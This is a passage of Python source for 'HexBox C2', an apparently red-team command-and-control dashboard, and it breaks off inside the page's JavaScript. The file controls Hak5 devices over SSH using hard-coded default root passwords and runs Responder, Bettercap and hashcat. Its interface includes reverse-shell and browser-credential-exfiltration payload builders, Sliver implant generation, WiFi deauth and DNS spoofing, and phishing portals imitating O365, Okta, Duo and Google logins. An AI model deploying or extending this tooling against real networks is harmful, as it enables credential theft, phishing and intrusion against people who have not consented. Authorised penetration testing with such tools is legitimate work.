#!/usr/bin/env python3
# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 5)

from flask import (Flask, render_template_string, request, jsonify,
                   send_file, session, redirect, Response)
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess, paramiko, requests as _req, json, os, signal, sys, shutil
import threading, shlex, socket, re, secrets, ipaddress, queue, time
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50 MB

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

def _load_cfg():
    p = Path(__file__).parent.parent / "config.json"
    return json.loads(p.read_text()) if p.exists() else {}

_CFG  = _load_cfg()
_HB   = _CFG.get("hexbox", {})
_IF   = _CFG.get("interfaces", {})
DEVICES = _CFG.get("devices") or {
    "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple", "api_port": 1471},
    "sharkjack":      {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
    "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
    "lanturtle":      {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
    "omgplug":        {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
    "bashbunny":      {"ip": "172.16.64.1",  "user": "root", "pass": "hak5bunny"},
}
_BUNNY_CFG   = _CFG.get("bashbunny") or DEVICES.get("bashbunny",
                   {"ip": "172.16.64.1", "user": "root", "pass": "hak5bunny"})
_FLIPPER_CFG = _CFG.get("flipper", {"serial_port": "/dev/ttyACM0"})
_BH_CFG      = _CFG.get("bloodhound", {"url": "http://localhost:8080",
                                        "username": "admin", "password": "BloodHound!"})
_SLIVER_CFG  = _CFG.get("sliver",  {"host": "127.0.0.1", "port": 31337})
_KISMET_CFG  = _CFG.get("kismet",  {"url": "http://localhost:2501",
                                     "username": "kismet", "password": "kismet"})

LOOT     = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
LOGS     = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
PAYLOADS = Path(__file__).parent.parent / "payloads"
PORT     = _HB.get("dashboard_port", 1337)
HEXBOX_IP   = _HB.get("ip", "10.0.0.99")
SCAN_TARGET = _HB.get("scan_target", "192.168.1.0/24")
IFACE_RESPONDER = _IF.get("responder", "eth0")
IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")

for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny",
          LOOT / "pcaps", LOOT / "portals", LOOT / "wardrive"):
    d.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------

_TOKEN = os.environ.get("HEXBOX_TOKEN") or _HB.get("api_token") or secrets.token_hex(16)
app.secret_key = secrets.token_hex(32)
_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver", "kismet"}


@app.before_request
def _require_auth():
    if request.endpoint in ("login", "logout", "events_stream"):
        return None
    if session.get("authed") or request.headers.get("X-HexBox-Token") == _TOKEN:
        return None
    if request.is_json or request.headers.get("X-HexBox-Token") is not None:
        return jsonify(error="Unauthorized"), 403
    return redirect("/login")

# ---------------------------------------------------------------------------
# SSE — real-time event broadcast
# ---------------------------------------------------------------------------

_sse_listeners: list[queue.Queue] = []
_sse_lock = threading.Lock()


def broadcast(event_type: str, data: dict):
    """Push an SSE event to all connected dashboard clients."""
    msg = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
    with _sse_lock:
        dead = [q for q in _sse_listeners
                if not _try_put(q, msg)]
        for q in dead:
            _sse_listeners.remove(q)


def _try_put(q: queue.Queue, msg: str) -> bool:
    try:
        q.put_nowait(msg)
        return True
    except queue.Full:
        return False

# ---------------------------------------------------------------------------
# Background loot watcher — broadcasts new_loot events
# ---------------------------------------------------------------------------

_known_loot: set[str] = set()
_watcher_started = False


def _loot_watcher():
    global _known_loot
    _known_loot = {str(p) for p in LOOT.rglob("*") if p.is_file()}
    while True:
        time.sleep(5)
        try:
            current = {str(p) for p in LOOT.rglob("*") if p.is_file()}
            new = current - _known_loot
            for path in sorted(new):
                rel = Path(path).relative_to(LOOT)
                sz  = Path(path).stat().st_size
                broadcast("new_loot", {
                    "path": str(rel),
                    "size": sz,
                    "ts":   datetime.now().strftime("%H:%M:%S"),
                })
                _log(f"New loot: {rel} ({sz} bytes)")
            _known_loot = current
        except Exception:
            pass

# ---------------------------------------------------------------------------
# Process tracking
# ---------------------------------------------------------------------------

_procs:      dict[str, subprocess.Popen] = {}
_procs_lock: threading.Lock              = threading.Lock()


def start_proc(name: str, cmd) -> int:
    with _procs_lock:
        _stop_proc_locked(name)
        use_shell = isinstance(cmd, str)
        p = subprocess.Popen(cmd, shell=use_shell,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             start_new_session=True)
        _procs[name] = p
    _log(f"Started {name} pid={p.pid}")
    broadcast("proc_start", {"name": name, "pid": p.pid,
                              "ts": datetime.now().strftime("%H:%M:%S")})
    return p.pid


def _stop_proc_locked(name: str) -> bool:
    p = _procs.pop(name, None)
    if not p:
        return False
    try:
        os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    except Exception:
        try:
            p.terminate()
        except Exception:
            pass
    return True

# ---------------------------------------------------------------------------
# SSH / SFTP helpers
# ---------------------------------------------------------------------------

def ssh_exec(device: str, cmd: str) -> str:
    d = DEVICES[device]
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=10)
        _, out, err = c.exec_command(cmd)
        return out.read().decode() + err.read().decode()
    except Exception as e:
        return f"[ERR] {e}"
    finally:
        c.close()


def sftp_pull(device: str, remote_dir: str, local_dir: Path) -> str:
    d = DEVICES[device]
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
        sftp = c.open_sftp()
        try:
            entries = sftp.listdir(remote_dir)
        except Exception:
            return f"[ERR] Cannot list {remote_dir}"
        local_dir.mkdir(parents=True, exist_ok=True)
        count = 0
        for name in entries:
            try:
                sftp.get(f"{remote_dir}/{name}", str(local_dir / name))
                count += 1
            except Exception:
                pass
        sftp.close()
        return f"Pulled {count} file(s) to {local_dir}"
    except Exception as e:
        return f"[ERR] {e}"
    finally:
        c.close()


def _log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOGS / "c2.log", "a") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Engagement session helpers
# ---------------------------------------------------------------------------

_SESSIONS_FILE = LOOT / "sessions.json"


def _load_sessions() -> dict:
    if _SESSIONS_FILE.exists():
        try:
            return json.loads(_SESSIONS_FILE.read_text())
        except Exception:
            pass
    return {"active": None, "sessions": []}


def _save_sessions(data: dict):
    _SESSIONS_FILE.write_text(json.dumps(data, indent=2))


def _active_session() -> dict | None:
    d = _load_sessions()
    active_name = d.get("active")
    for s in d.get("sessions", []):
        if s["name"] == active_name:
            return s
    return None

# ---------------------------------------------------------------------------
# Dashboard HTML — Phase 3: 6 tabs
# ---------------------------------------------------------------------------

DASH = r"""<!DOCTYPE html>
<html><head><title>HexBox C2</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:14px;margin:0;font-size:14px}
a{color:#0f0}
h1{margin:0 0 2px;font-size:1.3em;display:flex;align-items:center;gap:10px}
.eng-badge{background:#111;border:1px solid #333;padding:2px 8px;font-size:.72em;
           color:#ff0;cursor:pointer;flex-shrink:0}
.ts-bar{color:#444;font-size:.75em;margin-bottom:8px;display:flex;gap:12px;align-items:center}
button{background:#111;color:#0f0;border:1px solid #0f0;padding:5px 9px;margin:2px;
       cursor:pointer;font-family:monospace;font-size:.8em;transition:background .12s}
button:hover{background:#0f0;color:#000}
button.kill{border-color:#c00;color:#c00}button.kill:hover{background:#c00;color:#fff}
button.warn{border-color:#ff0;color:#ff0}button.warn:hover{background:#ff0;color:#000}
button.dim{border-color:#333;color:#555}button.dim:hover{background:#333;color:#ccc}
pre{background:#000;border:1px solid #0f0;padding:8px;max-height:300px;overflow:auto;
    font-size:.75em;white-space:pre-wrap;word-break:break-all;margin:4px 0}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:8px}
.card{border:1px solid #1a1a1a;padding:9px}
.card h2{color:#c00;margin:0 0 6px;font-size:.85em;display:flex;
         justify-content:space-between;align-items:center}
.dot{width:8px;height:8px;border-radius:50%;display:inline-block;
     background:#333;flex-shrink:0;cursor:help}
.dot.up{background:#0f0}.dot.dn{background:#c00}.dot.chk{background:#ff0;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.row{border:1px solid #111;padding:7px;margin-bottom:6px;display:flex;
     align-items:center;gap:7px;flex-wrap:wrap}
.row label{color:#555;font-size:.78em;white-space:nowrap}
input,select,textarea{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;
           font-family:monospace;font-size:.8em}
input:focus,select:focus,textarea:focus{outline:none;border-color:#0f0}
.bar{border:1px solid #111;padding:7px;margin-bottom:6px}
.bar h3{margin:0 0 5px;color:#ff0;font-size:.82em}
.sec{color:#c00;margin:8px 0 3px;font-size:.85em;font-weight:bold}
.tab-bar{display:flex;gap:3px;margin:8px 0 10px;border-bottom:1px solid #1a1a1a;padding-bottom:5px;flex-wrap:wrap}
.tab{background:#111;color:#555;border:1px solid #222;padding:5px 14px;
     cursor:pointer;font-family:monospace;font-size:.82em;transition:color .1s,border-color .1s}
.tab.active{color:#0f0;border-color:#0f0;background:#0a0a0a}
.tab:hover{color:#0f0}
/* Table styles */
table{width:100%;border-collapse:collapse;font-size:.78em;margin:4px 0}
th{background:#111;color:#0f0;text-align:left;padding:5px 8px;white-space:nowrap}
td{padding:4px 8px;border-bottom:1px solid #0d0d0d;vertical-align:top}
tr:hover td{background:#0d0d0d}
.hash-cell{font-size:.7em;color:#666;word-break:break-all;max-width:300px}
.copy-btn{font-size:.65em;padding:1px 5px;margin-left:4px}
.badge{background:#1a1a1a;border:1px solid #333;padding:1px 5px;font-size:.72em;color:#c00}
.badge.dc{color:#ff0;border-color:#ff0}
.badge.win{color:#0af}
/* Loot file list */
.loot-row{padding:4px 7px;border-bottom:1px solid #0a0a0a;display:flex;
          justify-content:space-between;align-items:center;font-size:.76em}
.loot-row:hover{background:#0d0d0d}
.loot-meta{color:#333;white-space:nowrap;margin-left:10px}
/* Activity feed */
#feed{font-size:.72em;color:#555;max-height:100px;overflow:auto;line-height:1.5}
.feed-line{padding:1px 0}
.feed-line.new-loot{color:#0a0}
.feed-line.proc-start{color:#0af}
.feed-line.hash-new{color:#ff0}
/* Toast */
#toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:6px}
.toast{background:#111;border:1px solid #0f0;padding:8px 14px;font-size:.78em;
       opacity:0;transition:opacity .3s;pointer-events:none;max-width:320px}
.toast.show{opacity:1}
.toast.warn{border-color:#ff0;color:#ff0}
.toast.err{border-color:#c00;color:#c00}
/* Payload builder */
#payload-preview{max-height:260px;font-size:.72em}
.pl-list-item{padding:4px 8px;border-bottom:1px solid #0d0d0d;display:flex;
              justify-content:space-between;align-items:center;font-size:.78em}
/* Report */
#report-stats{display:flex;gap:12px;margin:12px 0;flex-wrap:wrap}
.rstat{border:1px solid #1a1a1a;padding:10px 18px;text-align:center}
.rstat .rnum{font-size:1.8em;color:#0f0;display:block}
.rstat .rlbl{color:#444;font-size:.72em}
</style></head><body>

<div id="toast-container"></div>

<h1>&#x1F5A5; HexBox C2
  <span class="eng-badge" id="eng-name" onclick="showEngagementModal()" title="Click to manage engagement">&#x25CF; Loading...</span>
  <form method="POST" action="/logout" style="margin-left:auto;display:inline">
    <button class="dim" style="font-size:.72em;padding:3px 8px">Logout</button>
  </form>
</h1>
<div class="ts-bar">
  <span id="ts">—</span>
  <span id="proc-summary" style="color:#555">—</span>
</div>

<div class="tab-bar">
  <button class="tab active" id="btn-devices"  onclick="showTab('devices')">&#9881; Devices</button>
  <button class="tab"        id="btn-intel"    onclick="showTab('intel')">&#x1F4E1; Intel</button>
  <button class="tab"        id="btn-payloads" onclick="showTab('payloads')">&#x1F4BB; Payloads</button>
  <button class="tab"        id="btn-loot"     onclick="showTab('loot')">&#128193; Loot</button>
  <button class="tab"        id="btn-logs"     onclick="showTab('logs')">&#128203; Logs</button>
  <button class="tab"        id="btn-report"   onclick="showTab('report')">&#x1F4CB; Report</button>
  <button class="tab"        id="btn-wardrive" onclick="showTab('wardrive')">&#x1F4F6; War-Drive</button>
</div>

<!-- ========================= DEVICES TAB ========================= -->
<div id="pane-devices">
<div class="row">
  <label>Target:</label>
  <input id="tgt" value="{{target}}" style="min-width:160px;flex:1" placeholder="192.168.1.0/24">
  <button onclick="checkStatus()">&#x25CF; Ping Devices</button>
  <button onclick="run('/pi/scan')" title="Nmap scan — results parsed into Intel tab">&#128269; Nmap Scan</button>
  <button onclick="refreshProcs()">&#x21BA; Procs</button>
</div>

<div class="grid">
<div class="card"><h2>WiFi Pineapple<span class="dot" id="dot-pineapple" title="unknown"></span></h2>
  <button onclick="run('/pineapple/recon')">Recon</button>
  <button onclick="run('/pineapple/deauth')" class="kill">Deauth</button>
  <button onclick="run('/pineapple/evil_portal')">Evil Portal</button>
  <button onclick="run('/pineapple/monitor_mode')">Monitor Mode</button>
  <button onclick="run('/pineapple/pmkid')">PMKID</button>
  <button onclick="run('/pineapple/handshakes')">Pull Handshakes</button>
</div>

<div class="card"><h2>Shark Jack<span class="dot" id="dot-sharkjack" title="unknown"></span></h2>
  <button onclick="run('/shark/nmap')">Nmap Sweep</button>
  <button onclick="run('/shark/arp')">ARP Scan</button>
  <button onclick="run('/shark/loot')">Pull Loot</button>
</div>

<div class="card"><h2>Packet Squirrel<span class="dot" id="dot-packetsquirrel" title="unknown"></span></h2>
  <button onclick="run('/squirrel/pcap')">Start PCAP</button>
  <button onclick="run('/squirrel/dnsspoof')">DNS Spoof</button>
  <button onclick="run('/squirrel/arpscan')">ARP Scan</button>
  <button onclick="run('/squirrel/pull')">Pull PCAPs</button>
</div>

<div class="card"><h2>LAN Turtle<span class="dot" id="dot-lanturtle" title="unknown"></span></h2>
  <button onclick="run('/turtle/autossh')">AutoSSH</button>
  <button onclick="run('/turtle/responder')">Responder</button>
  <button onclick="run('/turtle/meterpreter')">Meterpreter</button>
  <button onclick="run('/turtle/sshpivot')">SSH Pivot</button>
</div>

<div class="card"><h2>OMG Plug<span class="dot" id="dot-omgplug" title="unknown"></span></h2>
  <button onclick="run('/omg/payload/reverse')">Reverse Shell</button>
  <button onclick="run('/omg/payload/exfil')">Exfil Browser</button>
  <button onclick="run('/omg/payload/wifi')">Steal WiFi</button>
  <button onclick="run('/omg/payload/sysinfo')">SysInfo</button>
  <button onclick="run('/omg/payload/ad_recon')">AD Recon</button>
</div>

<div class="card"><h2>Bash Bunny<span class="dot" id="dot-bashbunny" title="unknown"></span></h2>
  <button onclick="run('/bunny/recon')">Net Recon</button>
  <button onclick="run('/bunny/loot')">Pull Loot</button><br>
  <button onclick="installBunnyPayload(1)" class="warn">&#x2B07; Install Switch1</button>
  <button onclick="installBunnyPayload(2)" class="warn">&#x2B07; Install Switch2</button>
</div>

<div class="card"><h2>Flipper Zero<span class="dot" id="dot-flipper" title="unknown"></span></h2>
  <button onclick="flipperCmd('nfc')">NFC Detect</button>
  <button onclick="flipperCmd('rfid')">RFID Read</button>
  <button onclick="flipperCmd('subghz')">Sub-GHz RX</button>
  <button onclick="flipperCmd('badusb')" class="warn">BadUSB Run</button>
</div>

<div class="card"><h2>Pi Local</h2>
  <button onclick="run('/pi/responder')">Start Responder</button>
  <button onclick="stopProc('responder')" class="kill">Stop</button><br>
  <button onclick="run('/pi/bettercap')">Bettercap MITM</button>
  <button onclick="stopProc('bettercap')" class="kill">Stop</button><br>
  <button onclick="run('/pi/handshake_crack')">Crack Handshakes</button>
  <button onclick="run('/pi/hashcat')" class="warn">Hashcat NTLM</button>
  <button onclick="stopProc('crack')" class="kill">Stop</button>
</div>
</div><!-- /grid -->

<div class="bar"><h3>Background Processes</h3><div id="procs">—</div></div>
<h3 class="sec" style="cursor:pointer" onclick="this.nextSibling.style.display=this.nextSibling.style.display?'':'none'">Output &#9660;</h3>
<pre id="out">Awaiting orders...</pre>
<div class="bar" style="margin-top:6px">
  <h3>&#x26A1; Live Activity <span id="feed-dot" style="font-size:.7em;color:#333">&#x25CF;</span></h3>
  <div id="feed"><span style="color:#333">Connecting to event stream...</span></div>
</div>
<div class="bar" style="margin-top:6px">
  <h3>&#x1F527; System</h3>
  <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
    <button onclick="checkUpdate()">&#x1F50D; Check for Updates</button>
    <button onclick="applyUpdate()" id="btn-update" class="warn" style="display:none">&#x2B07; Pull &amp; Apply</button>
    <button onclick="restartC2()" class="kill">&#x21BA; Restart C2</button>
    <span id="update-status" style="color:#555;font-size:.78em"></span>
  </div>
  <pre id="update-out" style="display:none;max-height:160px;margin-top:6px"></pre>
</div>

<div class="bar" style="margin-top:6px">
  <h3>&#x1F5E1; Sliver C2</h3>
  <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
    <span class="dot" id="dot-sliver" title="unknown"></span>
    <button onclick="run('/sliver/start')">&#x25B6; Start Server</button>
    <button onclick="stopProc('sliver')" class="kill">&#x25A0; Stop</button>
    <button onclick="checkSliver()">&#x21BA; Status</button>
    <button onclick="listSliverSessions()" class="dim">Sessions</button>
    <span id="sliver-status" style="color:#555;font-size:.78em"></span>
  </div>
  <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;align-items:center">
    <label>OS:</label>
    <select id="sl-os"><option>windows</option><option>linux</option><option>darwin</option></select>
    <label>Arch:</label>
    <select id="sl-arch"><option>amd64</option><option>386</option><option>arm64</option></select>
    <label>Format:</label>
    <select id="sl-fmt"><option>exe</option><option>shellcode</option><option>shared</option></select>
    <label>Listener:</label>
    <input id="sl-listener" value="http://{{hexbox_ip}}" style="width:180px">
    <button onclick="generateImplant()" class="warn">&#x2692; Generate Implant</button>
    <button onclick="listImplants()" class="dim">&#x1F4C2; List Implants</button>
  </div>
  <pre id="sliver-out" style="max-height:140px;margin-top:6px;display:none"></pre>
  <div id="sliver-sessions" style="margin-top:4px"></div>
</div>
</div><!-- /pane-devices -->

<!-- ========================= INTEL TAB ========================= -->
<div id="pane-intel" style="display:none">
<div class="row">
  <button onclick="refreshIntel()">&#x21BA; Refresh Intel</button>
  <button onclick="copyHashes()" class="dim">&#x2398; Copy Hashes</button>
  <button onclick="copyWifi()" class="dim">&#x2398; Copy WiFi</button>
  <span class="ts" id="intel-ts"></span>
  <span id="badge-hashes" style="color:#ff0;font-size:.8em">—</span>
  <span id="badge-wifi" style="color:#0f0;font-size:.8em">—</span>
  <span id="badge-hosts" style="color:#0af;font-size:.8em">—</span>
</div>

<div class="sec">&#x1F6E1; NTLM Hashes</div>
<div id="intel-hashes"><span style="color:#333">Click Refresh to load...</span></div>

<div class="sec">&#x1F4F6; WiFi Credentials</div>
<div id="intel-wifi"><span style="color:#333">Click Refresh to load...</span></div>

<div class="sec">&#x1F5A7; Network Map</div>
<div id="intel-netmap"><span style="color:#333">Click Refresh to load...</span></div>

<div class="sec">&#x1F4BE; Chrome Databases</div>
<div id="intel-chrome"><span style="color:#333">Click Refresh to load...</span></div>

<div class="sec">&#x1F4BB; System Profiles</div>
<div id="intel-sysinfo"><span style="color:#333">Click Refresh to load...</span></div>

<div class="sec">&#x1F578; BloodHound Data</div>
<div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
  <button onclick="uploadToBH()" class="warn">&#x2B06; Upload to BloodHound</button>
  <button onclick="refreshBH()" class="dim">&#x21BA; Refresh</button>
  <span id="bh-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
</div>
<div id="intel-bloodhound"><span style="color:#333">Click Refresh to load BloodHound data...</span></div>

<div class="sec">&#x1F4E6; PCAP Analysis</div>
<div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
  <label>File:</label>
  <select id="pcap-sel" style="flex:1;min-width:180px"><option value="">— select PCAP —</option></select>
  <button onclick="loadPcapList()" class="dim">&#x21BA; Refresh</button>
  <button onclick="analyzePcap()" class="warn">&#x1F50D; Analyze</button>
  <span id="pcap-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
</div>
<div id="pcap-protocols" style="margin-bottom:6px"></div>
<div id="pcap-creds"><span style="color:#333">Select a PCAP and click Analyze...</span></div>
<div id="pcap-dns" style="margin-top:6px"></div>

<div class="sec">&#x1F3AD; Portal Credentials</div>
<div class="row" style="border:none;padding:4px 0">
  <button onclick="refreshPortalCreds()" class="dim">&#x21BA; Refresh</button>
  <span id="portal-cred-count" style="color:#555;font-size:.78em;margin-left:8px"></span>
</div>
<div id="intel-portal-creds"><span style="color:#333">Click Refresh to load portal captures...</span></div>
</div><!-- /pane-intel -->

<!-- ========================= PAYLOADS TAB ========================= -->
<div id="pane-payloads" style="display:none">
<div class="bar">
  <h3>&#x1F527; Payload Builder</h3>
  <div class="row" style="border:none;padding:4px 0">
    <label>Type:</label>
    <select id="pl-type">
      <option value="reverse_shell">Reverse Shell (TCP)</option>
      <option value="browser_exfil">Browser Credential Exfil</option>
      <option value="wifi_steal">WiFi Profile Steal</option>
      <option value="sysinfo">System Info Recon</option>
      <option value="ad_recon">Active Directory Recon</option>
    </select>
    <label>Callback IP:</label>
    <input id="pl-ip" value="{{hexbox_ip}}" style="width:130px">
    <label>Port:</label>
    <input id="pl-port" value="4444" style="width:64px">
    <label>Delay(ms):</label>
    <input id="pl-delay" value="2000" style="width:64px">
  </div>
  <div style="margin-top:4px">
    <button onclick="buildPayload()">&#x25B6; Build</button>
    <button onclick="downloadPayload()" class="dim">&#x2B07; Download .ducky</button>
    <button onclick="deployBuiltToOMG()" class="warn">&#x26A1; Deploy OMG</button>
  </div>
</div>
<pre id="payload-preview">Select type and click Build...</pre>

<div class="sec">Available Payloads</div>
<div id="payload-list"><span style="color:#333">Loading...</span></div>

<div class="bar" style="margin-top:8px">
  <h3>&#x1F3AD; Evil Portal</h3>
  <div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
    <label>Template:</label>
    <select id="portal-type">
      <option value="o365">Microsoft O365</option>
      <option value="okta">Okta</option>
      <option value="duo">Duo Security</option>
      <option value="google">Google</option>
    </select>
    <label>Catcher IP:</label>
    <input id="portal-ip" value="{{hexbox_ip}}" style="width:120px">
    <label>Port:</label>
    <input id="portal-port" value="8000" style="width:60px">
    <label>Redirect:</label>
    <input id="portal-redirect" placeholder="(auto)" style="width:180px">
  </div>
  <div style="margin-top:4px;display:flex;gap:6px;flex-wrap:wrap">
    <button onclick="previewPortal()">&#x1F441; Preview</button>
    <button onclick="downloadPortal()" class="dim">&#x2B07; Download</button>
    <button onclick="deployPortalToPineapple()" class="warn">&#x26A1; Deploy to Pineapple</button>
  </div>
  <div id="portal-msg" style="color:#555;font-size:.78em;margin-top:4px"></div>
</div>
</div><!-- /pane-payloads -->

<!-- ========================= LOOT TAB ========================= -->
<div id="pane-loot" style="display:none">
<div class="row">
  <button onclick="refreshLoot()">&#x21BA; Refresh</button>
  <span class="ts" id="loot-ts"></span>
  <span id="loot-summary" style="color:#555;font-size:.8em"></span>
</div>
<div id="loot-list" style="max-height:520px;overflow:auto;border:1px solid #111;padding:4px">
  <span style="color:#333">Click Refresh to load loot inventory...</span>
</div>
</div><!-- /pane-loot -->

<!-- ========================= LOGS TAB ========================= -->
<div id="pane-logs" style="display:none">
<div class="row">
  <label>Log:</label>
  <select id="log-sel">
    <option value="c2">c2.log</option>
    <option value="responder">responder.log</option>
    <option value="crack">crack.log</option>
    <option value="bettercap">bettercap.log</option>
    <option value="catcher">catcher.log</option>
    <option value="engage">engage.log</option>
    <option value="hashcat">hashcat.log</option>
  </select>
  <label>Lines:</label>
  <input id="log-n" value="100" style="width:56px">
  <button onclick="tailLog()">&#x21BA; Refresh</button>
  <label><input type="checkbox" id="auto-chk"> Auto (5s)</label>
</div>
<pre id="log-out" style="max-height:480px">Select a log and click Refresh...</pre>
</div><!-- /pane-logs -->

<!-- ========================= REPORT TAB ========================= -->
<div id="pane-report" style="display:none">
<div class="bar">
  <h3>&#x1F4CB; Engagement Report Generator</h3>
  <div class="row" style="border:none;padding:4px 0">
    <label>Name:</label>
    <input id="rep-name" style="width:200px" placeholder="Engagement name">
    <label>Target:</label>
    <input id="rep-target" style="width:160px" placeholder="192.168.1.0/24" value="{{target}}">
    <label>Notes:</label>
    <input id="rep-notes" style="flex:1;min-width:180px" placeholder="Optional notes...">
  </div>
  <div style="margin-top:4px">
    <button onclick="generateReport()">&#x25B6; Generate Report</button>
    <button onclick="viewReport()" id="btn-view-rep" class="dim" style="display:none">&#x1F441; View</button>
    <button onclick="downloadReport()" id="btn-dl-rep" class="dim" style="display:none">&#x2B07; Download HTML</button>
  </div>
</div>
<div id="report-stats" style="margin:10px 0"></div>
<div id="report-msg" style="color:#555;font-size:.82em">Configure the engagement details above and click Generate.</div>
</div><!-- /pane-report -->

<!-- ========================= WAR-DRIVE TAB ========================= -->
<div id="pane-wardrive" style="display:none">

<div class="row">
  <span class="dot" id="dot-kismet" title="Kismet"></span>
  <button onclick="run('/kismet/start')">&#x25B6; Start Kismet</button>
  <button onclick="stopProc('kismet')" class="kill">&#x25A0; Stop</button>
  <button onclick="refreshWardrive()">&#x21BA; Refresh</button>
  <button onclick="exportWardrive('csv')" class="dim">&#x2B07; CSV</button>
  <button onclick="exportWardrive('kml')" class="dim">&#x2B07; KML</button>
  <span id="kismet-status" style="color:#555;font-size:.78em;margin-left:6px"></span>
</div>

<div class="bar">
  <h3>&#x1F4CD; GPS Position</h3>
  <div id="gps-pos" style="font-family:monospace;color:#0f0;font-size:.85em">No GPS fix</div>
</div>

<div class="bar">
  <h3>&#x1F4F6; Discovered Networks <span id="net-count" style="color:#555;font-size:.8em"></span></h3>
  <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap">
    <input id="wd-filter" placeholder="Filter SSID / BSSID..." style="flex:1;min-width:160px"
           oninput="filterNetworks()">
    <label><input type="checkbox" id="wd-gps-only" onchange="filterNetworks()"> GPS only</label>
    <label><input type="checkbox" id="wd-open-only" onchange="filterNetworks()"> Open only</label>
  </div>
  <div style="overflow-x:auto">
    <table id="wd-table">
      <tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th><th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>
    </table>
  </div>
</div>

<div class="bar">
  <h3>&#x1F5FA; Coverage Map <span style="color:#333;font-size:.75em">(requires internet for tiles)</span></h3>
  <div id="wd-map" style="height:320px;border:1px solid #1a1a1a;background:#0a0a0a;
       display:flex;align-items:center;justify-content:center;color:#333;font-size:.82em">
    Map loads after networks are fetched
  </div>
</div>

</div><!-- /pane-wardrive -->

<!-- ========================= ENGAGEMENT MODAL ========================= -->
<div id="eng-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;
     background:rgba(0,0,0,.85);z-index:1000;align-items:center;justify-content:center">
<div style="background:#0d0d0d;border:1px solid #0f0;padding:24px;min-width:360px;max-width:480px">
  <h3 style="margin:0 0 16px;color:#0f0">Engagement Sessions</h3>
  <div class="row" style="border:none;padding:0 0 10px">
    <input id="new-eng-name" placeholder="New engagement name" style="flex:1">
    <input id="new-eng-target" placeholder="Target subnet" value="{{target}}" style="width:140px">
    <button onclick="newEngagement()">&#x2B; New</button>
  </div>
  <div id="eng-list" style="max-height:220px;overflow:auto;font-size:.82em">Loading...</div>
  <div style="margin-top:12px;text-align:right">
    <button onclick="closeEngModal()" class="dim">Close</button>
  </div>
</div>
</div>

<script>
// ---- Globals ----
const out = document.getElementById('out');
let _lastBuiltPayload = null, _lastBuiltType = null, _reportPath = null;
let _arTimer = null;

// ---- Clock ----
setInterval(() => {
  document.getElementById('ts').textContent = new Date().toLocaleString();
}, 1000);

// ---- Toast ----
function toast(msg, type='') {
  const c = document.getElementById('toast-container');
  const t = document.createElement('div');
  t.className = 'toast' + (type ? ' '+type : '');
  t.textContent = msg;
  c.appendChild(t);
  requestAnimationFrame(() => t.classList.add('show'));
  setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 350); }, 3500);
}

// ---- SSE event stream ----
function initSSE() {
  const feed = document.getElementById('feed');
  const dot  = document.getElementById('feed-dot');
  const es = new EventSource('/events');

  es.onopen = () => { dot.style.color = '#0f0'; };
  es.onerror = () => { dot.style.color = '#c00'; };

  function addFeedLine(cls, text) {
    const line = document.createElement('div');
    line.className = 'feed-line ' + cls;
    line.textContent = text;
    feed.insertBefore(line, feed.firstChild);
    while (feed.children.length > 30) feed.lastChild.remove();
  }

  es.addEventListener('new_loot', e => {
    const d = JSON.parse(e.data);
    addFeedLine('new-loot', `[${d.ts}] 🗂 New loot: ${d.path} (${(d.size/1024).toFixed(1)} KB)`);
    toast(`New loot: ${d.path}`);
  });

  es.addEventListener('proc_start', e => {
    const d = JSON.parse(e.data);
    addFeedLine('proc-start', `[${d.ts}] ▶ ${d.name} started (pid=${d.pid})`);
    refreshProcs();
  });

  es.addEventListener('proc_stop', e => {
    const d = JSON.parse(e.data);
